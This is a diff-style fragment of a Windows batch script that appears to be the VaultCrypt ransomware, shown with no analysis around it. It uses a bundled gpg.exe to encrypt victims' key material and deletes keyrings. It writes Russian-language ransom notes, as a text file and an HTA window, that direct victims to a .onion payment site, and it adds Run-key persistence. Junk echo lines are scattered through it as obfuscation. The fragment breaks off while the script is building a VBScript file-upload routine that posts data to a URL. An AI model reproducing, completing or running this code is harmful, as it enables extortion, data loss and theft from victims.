+echo NateBRaCu2ruphEbruPhATHeRAMe6rab &gt;nul
+echo sTEhet8TAveg2cek8neCuH3cR4f5xu3r &gt;nul
+del /f /q "!loco!.js"
+"%temp%\gpg.exe" --import "%temp%\03dfb98e.7087b06e"
+del /f /q "%temp%\03dfb98e.7087b06e"
+echo thu83E7r88Erup7etUbRuzaqathUchaB &gt;nul
+echo NateBRaCu2ruphEbruPhATHeRAMe6rab &gt;nul
+echo sTEhet8TAveg2cek8neCuH3cR4f5xu3r &gt;nul
+"%temp%\gpg.exe" -r VaultCrypt --yes -q --no-verbose --trust-model always -o "%temp%\VAULT.KEY" -e "%temp%\3637bf69.36ddf8fe"
+echo thu83E7r88Erup7etUbRuzaqathUchaB &gt;nul
+echo NateBRaCu2ruphEbruPhATHeRAMe6rab &gt;nul
+echo sTEhet8TAveg2cek8neCuH3cR4f5xu3r &gt;nul
+"%temp%\gpg.exe" -r VaultCrypt --yes -q --no-verbose --trust-model always -o "%temp%\CONFIRMATION.KEY" -e "%temp%\8f9c3dbb.9767d548"
+echo thu83E7r88Erup7etUbRuzaqathUchaB &gt;nul
+echo NateBRaCu2ruphEbruPhATHeRAMe6rab &gt;nul
+echo sTEhet8TAveg2cek8neCuH3cR4f5xu3r &gt;nul
+if not exist "%temp%\VAULT.KEY" (
+"%temp%\gpg.exe" -r VaultCrypt --yes -q --no-verbose --trust-model always --encrypt-files "%temp%\3637bf69.36ddf8fe"
+echo thu83E7r88Erup7etUbRuzaqathUchaB &gt;nul
+echo NateBRaCu2ruphEbruPhATHeRAMe6rab &gt;nul
+echo sTEhet8TAveg2cek8neCuH3cR4f5xu3r &gt;nul
+RENAME "%temp%\3637bf69.36ddf8fe.gpg" VAULT.KEY
+)
+if not exist "%temp%\CONFIRMATION.KEY" (
+"%temp%\gpg.exe" -r VaultCrypt --yes -q --no-verbose --trust-model always --encrypt-files "%temp%\8f9c3dbb.9767d548"
+RENAME "%temp%\8f9c3dbb.9767d548.gpg" CONFIRMATION.KEY
+echo spewuxeJubrupruthUmex33EpafrAbre &gt;nul
+echo T8eQewUvebR4fraThaKu2uqase85xe8u &gt;nul
+echo wrasatuNabrefr8stubruxuhAreCHapr &gt;nul
+)
+if not exist "%temp%\VAULT.KEY" (
+del /f /q "%temp%\*.vlt"
+del /f /q "%temp%\*.gpg"
+echo spewuxeJubrupruthUmex33EpafrAbre &gt;nul
+echo T8eQewUvebR4fraThaKu2uqase85xe8u &gt;nul
+echo wrasatuNabrefr8stubruxuhAreCHapr &gt;nul
+del /f /q "%temp%\random_seed"
+del /f /q "%temp%\*.lock"
+echo spewuxeJubrupruthUmex33EpafrAbre &gt;nul
+echo T8eQewUvebR4fraThaKu2uqase85xe8u &gt;nul
+echo wrasatuNabrefr8stubruxuhAreCHapr &gt;nul
+del /f /q "%temp%\*.bak"
+del /f /q "%temp%\*.list"
+echo spewuxeJubrupruthUmex33EpafrAbre &gt;nul
+echo T8eQewUvebR4fraThaKu2uqase85xe8u &gt;nul
+echo wrasatuNabrefr8stubruxuhAreCHapr &gt;nul
+goto 6d0f24b8
+)
+echo.&gt;&gt; "%temp%\VAULT.KEY"
+echo 01FNSH-!715c7be3!&gt;&gt; "%temp%\VAULT.KEY"
+echo 2hUwaJe7enacePrek25payEneteyuThU &gt;nul
+echo yu8avat34jeq4vapr3JUceC3uquvethe &gt;nul
+echo 02FNSH-!b67b5d00!&gt;&gt; "%temp%\VAULT.KEY"
+echo 2hUwaJe7enacePrek25payEneteyuThU &gt;nul
+echo yu8avat34jeq4vapr3JUceC3uquvethe &gt;nul
+echo 03FNSH-!db5a2d8a!&gt;&gt; "%temp%\VAULT.KEY"
+echo 04FNSH-!dc841a88!&gt;&gt; "%temp%\VAULT.KEY"
+echo 2hUwaJe7enacePrek25payEneteyuThU &gt;nul
+echo 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+echo VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+echo yu8avat34jeq4vapr3JUceC3uquvethe &gt;nul
+echo 05FNSH-!ee1f189d!&gt;&gt; "%temp%\VAULT.KEY"
+echo FHASH-!2162ea2b!&gt;&gt; "%temp%\VAULT.KEY"
+echo 2hUwaJe7enacePrek25payEneteyuThU &gt;nul
+echo yu8avat34jeq4vapr3JUceC3uquvethe &gt;nul
+
+echo 77406a1e885873e930cb056a91c09c60 25ca7a7cd21f132ab320494e&gt; "%temp%\secring.qpq"
+echo 2hUwaJe7enacePrek25payEneteyuThU &gt;nul
+echo yu8avat34jeq4vapr3JUceC3uquvethe &gt;nul
+echo 9767d5483a3b7af1 6d0f24b86d997bc025ca7a7c7bff218e4077430c&gt;&gt; "%temp%\secring.qpq"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+echo 9767d548 3a3b7af16d0f24b8 6d997bc025ca7a7c 7bff218e4077430c&gt;&gt; "%temp%\secring.qpq"
+echo 59665d79acda3f3369aca9093c843d11 a3811a181107cc4cc68cd952&gt;&gt; "%temp%\secring.qpq"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+echo 071faa5ef941ecc1 ca70214e1e7597484c2e533d97cf86b0e479bce7&gt;&gt; "%temp%\secring.qpq"
+echo acda3f33 ca70214e 91c09c6030cb056a cb2f4cf2 7bff218e4077430c&gt;&gt; "%temp%\secring.qpq"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+move /y "%temp%\secring.qpq" "%temp%\secring.gpg"
+echo 9767d548 3a3b7af16d0f24b8 6d997bc025ca7a7c 7bff218e4077430c&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+echo 071faa5ef941ecc1 ca70214e1e7597484c2e533d97cf86b0e479bce7&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 59665d79acda3f3369aca9093c843d11 a3811a181107cc4cc68cd952&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+echo 071faa5ef941ecc1 ca70214e1e7597484c2e533d97cf86b0e479bce7&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo acda3f33 ca70214e 91c09c6030cb056a cb2f4cf2 7bff218e4077430c&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 59665d79acda3f3369aca9093c843d11 a3811a181107cc4cc68cd952&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+echo 77406a1e885873e930cb056a91c09c60 25ca7a7cd21f132ab320494e&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 9767d5483a3b7af1 6d0f24b86d997bc025ca7a7c7bff218e4077430c&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+move /y "%temp%\36ddf8fe3637bf69.qpq" "%temp%\3637bf69.36ddf8fe"
+echo 59665d79acda3f3369aca9093c843d11 a3811a181107cc4cc68cd952&gt; "%temp%\9767d5488f9c3dbb.qpq"
+echo 9767d5483a3b7af1 6d0f24b86d997bc025ca7a7c7bff218e4077430c&gt;&gt; "%temp%\9767d5488f9c3dbb.qpq"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+echo 77406a1e885873e930cb056a91c09c60 25ca7a7cd21f132ab320494e&gt;&gt; "%temp%\9767d5488f9c3dbb.qpq"
+move /y "%temp%\9767d5488f9c3dbb.qpq" "%temp%\8f9c3dbb.9767d548"
+del /f /q "%temp%\secring.gpg"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+del /f /q "%temp%\3637bf69.36ddf8fe"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+del /f /q "%temp%\8f9c3dbb.9767d548"
+del /f /q "%temp%\21b0fb7b.7ca0ec0c"
+del /f /q "%temp%\random_seed"
+del /f /q "%temp%\trustdb.gpg"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+del /f /q "%temp%\secring.gpg"
+del /f /q "%temp%\*.lock"
+del /f /q "%temp%\*.bak"
+attrib -s -h -r "%AppData%\gnupg\*.*"
+attrib -s -h -r "%AppData%\gnupg"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+del /f /q "%AppData%\gnupg\*.*"
+rmdir /s /q "%AppData%\gnupg"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+copy /y "%temp%\CONFIRMATION.KEY" "%appdata%\CONFIRMATION.KEY"
+copy /y "%temp%\VAULT.KEY" "%appdata%\VAULT.KEY"
+echo jePHAHasweN4z3be26ejusWeQeQufRa4 &gt;nul
+echo 8ExA3rE6asasaxaZa4a2ezeQewe8rusa &gt;nul
+copy /y "%temp%\VAULT.KEY" "%temp%\4077430c_VAULT.KEY"
+echo 01FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo 02FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo ChAwuchep3EdRetR7CHUkebrUfRat5cu &gt;nul
+echo zuphuru3T7w4amEdr8wuzu3ucEfuvupr &gt;nul
+echo bUbad3evac2ecRePUKAmebr77uCUG2br &gt;nul
+echo 03FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo 04FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo ChAwuchep3EdRetR7CHUkebrUfRat5cu &gt;nul
+echo zuphuru3T7w4amEdr8wuzu3ucEfuvupr &gt;nul
+echo bUbad3evac2ecRePUKAmebr77uCUG2br &gt;nul
+echo 05FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo ChAwuchep3EdRetR7CHUkebrUfRat5cu &gt;nul
+echo zuphuru3T7w4amEdr8wuzu3ucEfuvupr &gt;nul
+echo ChAwuchep3EdRetR7CHUkebrUfRat5cu &gt;nul
+echo zuphuru3T7w4amEdr8wuzu3ucEfuvupr &gt;nul
+echo bUbad3evac2ecRePUKAmebr77uCUG2br &gt;nul
+echo bUbad3evac2ecRePUKAmebr77uCUG2br &gt;nul
+echo FHASH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+attrib +r "%temp%\4077430c_VAULT.KEY"
+copy /y "%temp%\VAULT.KEY" "%userprofile%\Desktop\VAULT.KEY"
+echo.&gt; "%temp%\VAULT.txt"
+echo Ваши рабочие документы и базы данных были заблокированы и помечены форматом .vаult &gt;&gt; "%temp%\VAULT.txt"
+echo ChAwuchep3EdRetR7CHUkebrUfRat5cu &gt;nul
+echo 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+echo VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+echo zuphuru3T7w4amEdr8wuzu3ucEfuvupr &gt;nul
+echo bUbad3evac2ecRePUKAmebr77uCUG2br &gt;nul
+
+echo CNKM5uZisBFr8E8ZvA92aYEyCErjpEnbT3MtueqFD3AJPcEcrb
+echo RobfE3bEJP9vMkgaekFEjsqvlEaHscq14JcFSZlrQyjrKNyTge
+echo Для их восстановления необходимо получить уникальный ключ&gt;&gt; "%temp%\VAULT.txt"
+echo ChAwuchep3EdRetR7CHUkebrUfRat5cu &gt;nul
+echo zuphuru3T7w4amEdr8wuzu3ucEfuvupr &gt;nul
+echo bUbad3evac2ecRePUKAmebr77uCUG2br &gt;nul
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo   ПРОЦЕДУРА ПОЛУЧЕНИЯ КЛЮЧА: &gt;&gt; "%temp%\VAULT.txt"
+echo ChAwuchep3EdRetR7CHUkebrUfRat5cu &gt;nul
+echo zuphuru3T7w4amEdr8wuzu3ucEfuvupr &gt;nul
+echo bUbad3evac2ecRePUKAmebr77uCUG2br &gt;nul
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo КРАТКО&gt;&gt; "%temp%\VAULT.txt"
+echo 1. Перейдите на наш веб-ресурс&gt;&gt; "%temp%\VAULT.txt"
+echo ChAwuchep3EdRetR7CHUkebrUfRat5cu &gt;nul
+echo zuphuru3T7w4amEdr8wuzu3ucEfuvupr &gt;nul
+echo bUbad3evac2ecRePUKAmebr77uCUG2br &gt;nul
+echo 2. Гарантированно получите Ваш ключ&gt;&gt; "%temp%\VAULT.txt"
+echo ChAwuchep3EdRetR7CHUkebrUfRat5cu &gt;nul
+echo zuphuru3T7w4amEdr8wuzu3ucEfuvupr &gt;nul
+echo bUbad3evac2ecRePUKAmebr77uCUG2br &gt;nul
+echo 3. Восстановите файлы в прежний вид&gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo ChAwuchep3EdRetR7CHUkebrUfRat5cu &gt;nul
+echo zuphuru3T7w4amEdr8wuzu3ucEfuvupr &gt;nul
+echo bUbad3evac2ecRePUKAmebr77uCUG2br &gt;nul
+echo ДЕТАЛЬНО&gt;&gt; "%temp%\VAULT.txt"
+echo ChAwuchep3EdRetR7CHUkebrUfRat5cu &gt;nul
+echo zuphuru3T7w4amEdr8wuzu3ucEfuvupr &gt;nul
+echo bUbad3evac2ecRePUKAmebr77uCUG2br &gt;nul
+echo   Шаг 1:&gt;&gt; "%temp%\VAULT.txt"
+echo Скачайте Tor браузер с официального сайта: http://torproject.org&gt;&gt; "%temp%\VAULT.txt"
+echo ChAwuchep3EdRetR7CHUkebrUfRat5cu &gt;nul
+echo zuphuru3T7w4amEdr8wuzu3ucEfuvupr &gt;nul
+echo bUbad3evac2ecRePUKAmebr77uCUG2br &gt;nul
+echo   Шаг 2:&gt;&gt; "%temp%\VAULT.txt"
+echo Используя Tor браузер посетите сайт: http://restoredz4xpmuqr.onion&gt;&gt; "%temp%\VAULT.txt"
+echo   Шаг 3:&gt;&gt; "%temp%\VAULT.txt"
+echo WabrUswUrafuThezUzusw6gEgephubAS &gt;nul
+echo 6AnutaprUstura2echaNu7wujEbrusp5 &gt;nul
+echo Найдите Ваш уникальный VAULT.KEY на компьютере - это Ваш ключ к личной клиент-панели. Не удалите его&gt;&gt; "%temp%\VAULT.txt"
+echo WabrUswUrafuThezUzusw6gEgephubAS &gt;nul
+echo 6AnutaprUstura2echaNu7wujEbrusp5 &gt;nul
+echo Авторизируйтесь на сайте используя ключ VAULT.KEY&gt;&gt; "%temp%\VAULT.txt"
+echo Перейдите в раздел FAQ и ознакомьтесь с дальнейшей процедурой&gt;&gt; "%temp%\VAULT.txt"
+echo   STEP 4:&gt;&gt; "%temp%\VAULT.txt"
+echo WabrUswUrafuThezUzusw6gEgephubAS &gt;nul
+echo 6AnutaprUstura2echaNu7wujEbrusp5 &gt;nul
+echo После получения ключа, Вы можете восстановить файлы используя наше ПО с открытым исходным кодом или же безопасно использовать своё ПО&gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo ДОПОЛНИТЕЛЬНО&gt;&gt; "%temp%\VAULT.txt"
+echo WabrUswUrafuThezUzusw6gEgephubAS &gt;nul
+echo 6AnutaprUstura2echaNu7wujEbrusp5 &gt;nul
+echo a^) Вы не сможете восстановить файлы без уникального ключа ^(который безопасно хранится на нашем сервере^)&gt;&gt; "%temp%\VAULT.txt"
+echo b^) Если Вы не можете найти Ваш VAULT.KEY, поищите во временной папке TEMP &gt;&gt; "%temp%\VAULT.txt"
+echo WabrUswUrafuThezUzusw6gEgephubAS &gt;nul
+echo 6AnutaprUstura2echaNu7wujEbrusp5 &gt;nul
+echo c^) Ваша стоимость восстановления не окончательная, пишите в чат&gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo WabrUswUrafuThezUzusw6gEgephubAS &gt;nul
+echo 6AnutaprUstura2echaNu7wujEbrusp5 &gt;nul
+echo   Дата блокировки: %date% ^(%time:~0,5%^)&gt;&gt; "%temp%\VAULT.txt"
+copy /y "%temp%\VAULT.txt" "%userprofile%\Desktop\vault.txt"
+attrib +h "%userprofile%\Desktop\vault.txt"
+echo WabrUswUrafuThezUzusw6gEgephubAS &gt;nul
+
+echo CNKM5uZisBFr8E8ZvA92aYEyCErjpEnbT3MtueqFD3AJPcEcrb
+echo RobfE3bEJP9vMkgaekFEjsqvlEaHscq14JcFSZlrQyjrKNyTge
+echo 6AnutaprUstura2echaNu7wujEbrusp5 &gt;nul
+echo var cdp="%%TeMp%%\\4c2e533d.cmd";var WshShell=CreateObject("WScript.Shell");cdp=WshShell.ExpandEnvironmentStrings(cdp);function CreateObject(fq){return new ActiveXObject(fq)}function xx(cdp){WshShell.Run(cdp,0,0);}xx(''+cdp+'');&gt;&gt; "%temp%\e33176c1.js"
+echo WabrUswUrafuThezUzusw6gEgephubAS &gt;nul
+echo 6AnutaprUstura2echaNu7wujEbrusp5 &gt;nul
+"%TEMP%\gpg.exe" --import "%TEMP%\pubring.gpg"
+echo WabrUswUrafuThezUzusw6gEgephubAS &gt;nul
+echo 6AnutaprUstura2echaNu7wujEbrusp5 &gt;nul
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "e1a04a3c" /t REG_SZ /f /d "notepad %temp%\VAULT.txt"
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ed3f074a" /t REG_SZ /f /d "attrib -h %userprofile%\Desktop\vault.txt"
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "58f139df" /t REG_SZ /f /d "wscript //B //Nologo %temp%\e33176c1.js"
+call "%temp%\4c2e533d.cmd"
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+echo ^&lt;html^&gt;^&lt;head^&gt;^&lt;hta:application BORDER = "none" CAPTION = "No" CONTEXTMENU = "Yes" INNERBORDER = "No" MAXIMIZEBUTTON = "No" MINIMIZEBUTTON = "No" NAVIGABLE = "No" SCROLL = "No" SCROLLFLAT = "No" SELECTION = "Yes" SHOWINTASKBAR = "No" SINGLEINSTANCE = "Yes" SYSMENU = "No"/^&gt;^&lt;style^&gt;body{cursor:default;background-color:#E7E7E7;margin:0;font-family:"HelveticaNeue-Light","Helvetica Neue Light","Helvetica Neue",Helvetica,Arial,sans-serif;text-align:center;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaAgMAAADUJKRdAAAACVBMVEXs7Ozv7+/6+vqH/Ct2AAAAW0lEQVQI11WOsQ2DABADv8gAGQFd4SJTZARGQC5cMBX1T0mD4ClP9lmutf71qW/t3d19VBLDcrNR7KV+F4Mx28OKyMzf/UDINvYADR9A08cwfcnjDwmarOBn7wSqEUpFZuJdBQAAAABJRU5ErkJggg==)}.vaustyle{margin:10px;height:520px;width:1100px}.sc{margin:10px 150px;font-size:40px;width:900px;padding:20px;background-color:#7a7a7a;color:#FF4C4C;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAJ0lEQVR42mXMsQkAAAzDMH+S/69M6VAoeAgGDQFIW/4QQARbwaF+B3+SPGAo8blgAAAAAElFTkSuQmCC)}.briefly{position:absolute;left:50px;width:480px}.detailed{display:inline-block;margin-left:530px;width:660px}.bti{background-color:#DFDFDF;color:#555;font-size:28px;padding:10px}hr{width:90%%}.sced{margin-top:15px;text-align:center;font-size:27px;height:220px;padding:20px;background-color:#6a6a6a;line-height:1.5;color:#EAEAEA;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAJ0lEQVR42mXMsQkAAAzDMH+S/69M6VAoeAgGDQFIW/4QQARbwaF+B3+SPGAo8blgAAAAAElFTkSuQmCC)}form{display:inline}.dbutt{margin-left:2px;font-size:16px;font-weight:500;border:none;background-color:#9f9f9f;color:#EEE;cursor:pointer}.footer{text-align:left;position:relative;width:600px;margin:2px 2px 2px 45px;height:16px;font-size:15px;background-color:#CFCFCF;color:#444;padding:6px}.fnl{font-size:21px}^&lt;/style^&gt;^&lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"/^&gt;^&lt;title^&gt;Vault Notification^&lt;/title^&gt;^&lt;script language="vbscript"^&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+echo sub Window_Onload&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo window.resizeTo 1280,725&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+echo screenWidth = Document.ParentWindow.Screen.AvailWidth&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo screenHeight = Document.ParentWindow.Screen.AvailHeight&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+echo posLeft = (screenWidth - 1280) / 2 &gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo posTop = (screenHeight - 725) / 2 &gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo window.moveTo posLeft, posTop &gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo end sub &gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+echo ^&lt;/script^&gt;^&lt;/head^&gt;^&lt;body scroll="no"^&gt;^&lt;div class="vaustyle"^&gt;^&lt;div class="sc"^&gt;Ваши документы и базы данных были зашифрованы и помещены в^&lt;br^&gt;^☢^ ^&lt;b^&gt;формат .VAULT^&lt;/b^&gt;^ ^☢^&lt;/div^&gt;^&lt;div class="sc" style="font-size:20px;width:800px;margin-left:200px;color:#EAEAEA;"^&gt;Для их восстановления необходимо получить ^&lt;b^&gt;Ваш ключ^&lt;/b^&gt;^&lt;/div^&gt;^&lt;br^&gt;^&lt;div class="briefly"^&gt;^&lt;div class="bti"^&gt;^&lt;b^&gt;Кратко:^&lt;/b^&gt;^&lt;/div^&gt;^&lt;div class="sced"^&gt;Необходимо произвести 3 шага:^&lt;hr^&gt; ^➠ Перейдите на наш веб-ресурс^&lt;br^&gt; ^Ⓑ Получите свой ключ^&lt;br^&gt;^⤷ ^&lt;b^&gt;Восстановите файлы^&lt;/b^&gt;^&lt;/div^&gt;^&lt;/div^&gt;^&lt;div class="detailed"^&gt;^&lt;div class="bti"^&gt;^&lt;b^&gt;Детально:^&lt;/b^&gt;^&lt;/div^&gt;^&lt;div class="sced"^&gt;Скачайте ^&lt;b^&gt;Tor^&lt;/b^&gt; браузер с оф. сайта ^&lt;form action="http://dist.torproject.org/torbrowser/4.5.2/torbrowser-install-4.5.2_ru.exe"^&gt;^&lt;input class="dbutt" type="submit" value="⇣ Загрузить"^&gt;^&lt;/form^&gt;^&lt;form action="https://www.torproject.org/projects/torbrowser.html.en#windows"^&gt;^&lt;input class="dbutt" type="submit" value="Help" style="padding-bottom:1px;"^&gt;^&lt;/form^&gt;^&lt;hr^&gt;Перейдите на наш сайт ^&lt;b^&gt;используя Tor^&lt;/b^&gt;:^&lt;br^&gt;^&lt;div class="bti" style="margin:1px 8%%;padding:0px;cursor:text;"^&gt;http://restoredz4xpmuqr.onion^&lt;/div^&gt;^&lt;form action="http://pastebin.com/rs7jZ0TW"^&gt;^&lt;input class="dbutt" type="submit" value="Не работает?"^&gt;^ ^⤴^&lt;/form^&gt;^&lt;hr^&gt;^&lt;div class="fnl"^&gt;Авторизируйтесь ^ ^➤^  ^&lt;b^&gt;Прочитайте отзывы^&lt;/b^&gt; ^ ^➤^  Ключ^&lt;/div^&gt;^&lt;/div^&gt;^&lt;div class="footer"^&gt;^&lt;b^&gt;Note 1:^&lt;/b^&gt; Вы не сможете восстановить файлы без уникального ключа.^&lt;/div^&gt;^&lt;div class="footer"^&gt;^&lt;b^&gt;Note 2:^&lt;/b^&gt; Перед авторизацией, Вы ^&lt;u^&gt;должны^&lt;/u^&gt; найти Ваш ^&lt;b^&gt;VAULT.KEY^&lt;/b^&gt; на компьютере.^&lt;/div^&gt;^&lt;div class="footer"^&gt;^&lt;b^&gt;Note 3: Стоимость полного восстановления на ресурсе не окончательная^&lt;/div^&gt;^&lt;/div^&gt;^&lt;/body^&gt;^&lt;/html^&gt;&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+copy /y "%temp%\ddae25beb5b57d6e.hta" "%appdata%\ddae25beb5b57d6e.hta"
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+del /f /q "%temp%\4c2e533d.cmd"
+attrib +h "%appdata%\ddae25beb5b57d6e.hta"
+attrib +r +s "%temp%\VAULT.KEY"
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+attrib +r +s "%appdata%\VAULT.KEY"
+attrib +r +s "%userprofile%\Desktop\VAULT.KEY"
+:6d0f24b8
+echo do_vbsUpload &gt; "%temp%\77406a1e.vbs"
+echo Sub do_vbsUpload^(^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim FileName,DestURL,FieldName &gt;&gt; "%temp%\77406a1e.vbs"
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+echo FieldName="FileField" &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim aCounter,Arg &gt;&gt; "%temp%\77406a1e.vbs"
+echo aCounter=1 &gt;&gt; "%temp%\77406a1e.vbs"
+echo For Each Arg In WScript.Arguments &gt;&gt; "%temp%\77406a1e.vbs"
+echo Select Case aCounter &gt;&gt; "%temp%\77406a1e.vbs"
+echo Case 1: FileName=Arg &gt;&gt; "%temp%\77406a1e.vbs"
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+echo Case 2: DestURL=Arg &gt;&gt; "%temp%\77406a1e.vbs"
+echo Case 3: FieldName=Arg &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Select &gt;&gt; "%temp%\77406a1e.vbs"
+echo aCounter=aCounter+1 &gt;&gt; "%temp%\77406a1e.vbs"
+echo Next &gt;&gt; "%temp%\77406a1e.vbs"
+echo jeg3pHEnaphEcrasTaFREstAkAc5uXEw &gt;nul
+echo 8resWe46Dra2ejed5EgefracraVUweth &gt;nul
+echo UploadFile DestURL,FileName,FieldName &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Sub &gt;&gt; "%temp%\77406a1e.vbs"
+echo Sub UploadFile^(DestURL,FileName,FieldName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo Const Boundary="---------------------------0123456789012" &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim FileContents,FormData &gt;&gt; "%temp%\77406a1e.vbs"
+echo FileContents=GetFile^(FileName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo FormData=BuildFormData^(FileContents,Boundary,FileName,FieldName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo IEPostBinaryRequest DestURL,FormData,Boundary &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Sub &gt;&gt; "%temp%\77406a1e.vbs"
+echo Function BuildFormData^(FileContents,Boundary,FileName,FieldName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim FormData,Pre,Po &gt;&gt; "%temp%\77406a1e.vbs"
